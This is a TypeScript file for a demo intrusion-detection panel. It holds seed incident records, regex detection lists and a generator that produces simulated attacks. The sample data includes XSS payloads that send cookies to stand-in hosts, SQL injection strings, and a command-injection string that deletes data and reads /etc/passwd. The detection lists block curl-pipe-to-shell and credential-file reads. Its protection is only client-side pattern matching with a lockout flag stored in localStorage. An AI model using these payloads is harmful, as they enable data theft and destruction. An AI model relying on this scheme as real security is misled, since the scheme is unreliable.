export interface SecurityIncident {
  id: string;
  timestamp: string;
  threatType: 'SQL Injection' | 'XSS Script Injection' | 'Brute Force PIN Attack' | 'Unauthorized Token Access' | 'Malicious Data Scraping' | 'Path Traversal' | 'Command Injection';
  severity: 'Medium' | 'High' | 'Critical';
  attackerIp: string;
  deviceFingerprint: string;
  payloadExcerpt: string;
  status: 'Blocked & Quarantined' | 'Mitigated' | 'Monitoring';
}

export interface BlockedHacker {
  id: string;
  ip: string;
  deviceFingerprint: string;
  blockedAt: string;
  reason: string;
  threatLevel: 'High' | 'Critical';
  attemptsCount: number;
}

// Initial seed blocked hacker attempts for demonstration
export const INITIAL_BLOCKED_HACKERS: BlockedHacker[] = [
  {
    id: 'block-01',
    ip: '185.220.101.44 (Tor Exit Node / Darknet)',
    deviceFingerprint: 'FP_9a4f210d_Linux_TorBrowser',
    blockedAt: '12 min ago',
    reason: 'SQL Injection attempt on candidate salary database: UNION SELECT * FROM users--',
    threatLevel: 'Critical',
    attemptsCount: 7
  },
  {
    id: 'block-02',
    ip: '45.154.255.89 (Known Malicious Botnet ASN)',
    deviceFingerprint: 'FP_bb7012ef_HeadlessChrome_Bot',
    blockedAt: '1 hour ago',
    reason: 'Rapid brute-force PIN attack on encrypted app vault (12 attempts in 4 seconds)',
    threatLevel: 'Critical',
    attemptsCount: 12
  },
  {
    id: 'block-03',
    ip: '103.241.22.18 (Automated Scraper Bot)',
    deviceFingerprint: 'FP_339a11ac_Python_Requests',
    blockedAt: '3 hours ago',
    reason: 'Unauthorized WhatsApp 1000-lead database harvesting and malicious payload injection',
    threatLevel: 'High',
    attemptsCount: 4
  }
];

export const INITIAL_INCIDENTS: SecurityIncident[] = [
  {
    id: 'inc-01',
    timestamp: '12 min ago',
    threatType: 'SQL Injection',
    severity: 'Critical',
    attackerIp: '185.220.101.44',
    deviceFingerprint: 'FP_9a4f210d',
    payloadExcerpt: "admin' UNION SELECT id, name, currentCTC FROM candidates WHERE '1'='1",
    status: 'Blocked & Quarantined'
  },
  {
    id: 'inc-02',
    timestamp: '1 hour ago',
    threatType: 'Brute Force PIN Attack',
    severity: 'Critical',
    attackerIp: '45.154.255.89',
    deviceFingerprint: 'FP_bb7012ef',
    payloadExcerpt: 'Automated rapid PIN permutation [0000 -> 9999]',
    status: 'Blocked & Quarantined'
  },
  {
    id: 'inc-03',
    timestamp: '3 hours ago',
    threatType: 'XSS Script Injection',
    severity: 'High',
    attackerIp: '103.241.22.18',
    deviceFingerprint: 'FP_339a11ac',
    payloadExcerpt: '<script>document.location="http://rogue-server.xyz/steal?c="+document.cookie</script>',
    status: 'Blocked & Quarantined'
  }
];

// Dangerous patterns for real-time intrusion detection (Anti-Hack Engine)
const SQLI_PATTERNS = [
  /union\s+select/i,
  /'\s*or\s*'1'\s*=\s*'1/i,
  /'\s*or\s*1\s*=\s*1/i,
  /drop\s+table/i,
  /insert\s+into/i,
  /delete\s+from/i,
  /update\s+.*\s+set/i,
  /;\s*--/i,
  /exec\s*\(/i,
  /benchmark\s*\(/i,
  /sleep\(\d+\)/i
];

const XSS_PATTERNS = [
  /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
  /javascript:/i,
  /onerror\s*=/i,
  /onload\s*=/i,
  /eval\s*\(/i,
  /document\.cookie/i,
  /<iframe/i,
  /alert\s*\(/i
];

const COMMAND_INJECTION_PATTERNS = [
  /;\s*rm\s+-rf/i,
  /cat\s+\/etc\/(passwd|shadow)/i,
  /curl\s+http.*\|\s*sh/i,
  /wget\s+http.*\|\s*bash/i,
  /\.\.\/\.\.\//i
];

// Storage helpers
export function getStoredBlockedHackers(): BlockedHacker[] {
  try {
    const data = localStorage.getItem('whatsblast_blocked_hackers');
    return data ? JSON.parse(data) : INITIAL_BLOCKED_HACKERS;
  } catch {
    return INITIAL_BLOCKED_HACKERS;
  }
}

export function saveStoredBlockedHackers(hackers: BlockedHacker[]) {
  try {
    localStorage.setItem('whatsblast_blocked_hackers', JSON.stringify(hackers));
  } catch {}
}

export function getStoredSecurityIncidents(): SecurityIncident[] {
  try {
    const data = localStorage.getItem('whatsblast_security_incidents');
    return data ? JSON.parse(data) : INITIAL_INCIDENTS;
  } catch {
    return INITIAL_INCIDENTS;
  }
}

export function saveStoredSecurityIncidents(incidents: SecurityIncident[]) {
  try {
    localStorage.setItem('whatsblast_security_incidents', JSON.stringify(incidents));
  } catch {}
}

// Check if current device or IP is currently locked out as a blocked hacker
export function isCurrentSessionHackerBlocked(): boolean {
  try {
    return localStorage.getItem('whatsblast_hacker_lockout') === 'true';
  } catch {
    return false;
  }
}

export function setHackerLockout(blocked: boolean) {
  try {
    if (blocked) {
      localStorage.setItem('whatsblast_hacker_lockout', 'true');
    } else {
      localStorage.removeItem('whatsblast_hacker_lockout');
    }
  } catch {}
}

// Security Inspection function: checks input in real-time
export function inspectInputForThreats(input: string): { 
  isThreat: boolean; 
  type?: SecurityIncident['threatType']; 
  severity?: SecurityIncident['severity']; 
  payload?: string;
  reason?: string;
} {
  if (!input || typeof input !== 'string') return { isThreat: false };

  // Check SQL injection
  for (const pattern of SQLI_PATTERNS) {
    if (pattern.test(input)) {
      return {
        isThreat: true,
        type: 'SQL Injection',
        severity: 'Critical',
        payload: input.slice(0, 100),
        reason: 'Attempted SQL database exploit or unauthorized table dump'
      };
    }
  }

  // Check XSS
  for (const pattern of XSS_PATTERNS) {
    if (pattern.test(input)) {
      return {
        isThreat: true,
        type: 'XSS Script Injection',
        severity: 'High',
        payload: input.slice(0, 100),
        reason: 'Attempted malicious JavaScript execution or cookie hijacking'
      };
    }
  }

  // Check Command Injection & Path Traversal
  for (const pattern of COMMAND_INJECTION_PATTERNS) {
    if (pattern.test(input)) {
      return {
        isThreat: true,
        type: 'Command Injection',
        severity: 'Critical',
        payload: input.slice(0, 100),
        reason: 'Attempted server command execution or directory path traversal'
      };
    }
  }

  return { isThreat: false };
}

// Generate realistic simulated attacker for interactive threat demos
export function generateThreatIncident(
  threatType: SecurityIncident['threatType'],
  customPayload?: string
): { incident: SecurityIncident; hacker: BlockedHacker } {
  const ips = [
    '185.220.101.44 (Tor Network Node)',
    '194.26.29.112 (Bulletproof VPS - Eastern Europe)',
    '45.134.140.23 (Compromised Proxy Node)',
    '103.241.22.18 (Automated Python Scraping Bot)',
    '91.240.118.82 (Malicious Darknet Relay)'
  ];

  const defaultPayloads: Record<SecurityIncident['threatType'], string> = {
    'SQL Injection': "SELECT * FROM leads WHERE '1'='1' UNION SELECT ctc, phone FROM candidates--",
    'XSS Script Injection': "<script>window.fetch('https://darkweb-drop.cc/exfiltrate?token='+document.cookie)</script>",
    'Brute Force PIN Attack': 'Automated rapid PIN permutation [0000 -> 9999] (30 attempts/sec)',
    'Unauthorized Token Access': 'Forged Bearer JWT header with elevated admin privilege claim',
    'Malicious Data Scraping': 'High-velocity automated scraper crawling 1,000 lead phone numbers without authorization',
    'Path Traversal': '../../../../etc/shadow system credentials access attempt',
    'Command Injection': '; rm -rf /var/data; cat /etc/passwd'
  };

  const selectedIp = ips[Math.floor(Math.random() * ips.length)];
  const fingerprint = `FP_${Math.random().toString(16).slice(2, 8).toUpperCase()}_Linux_RogueBot`;
  const payload = customPayload || defaultPayloads[threatType];

  const incident: SecurityIncident = {
    id: `inc-${Date.now()}`,
    timestamp: 'Just now',
    threatType,
    severity: 'Critical',
    attackerIp: selectedIp.split(' ')[0],
    deviceFingerprint: fingerprint,
    payloadExcerpt: payload,
    status: 'Blocked & Quarantined'
  };

  const hacker: BlockedHacker = {
    id: `block-${Date.now()}`,
    ip: selectedIp,
    deviceFingerprint: fingerprint,
    blockedAt: 'Just now',
    reason: `${threatType}: ${payload.slice(0, 80)}`,
    threatLevel: 'Critical',
    attemptsCount: Math.floor(Math.random() * 5) + 1
  };

  return { incident, hacker };
}
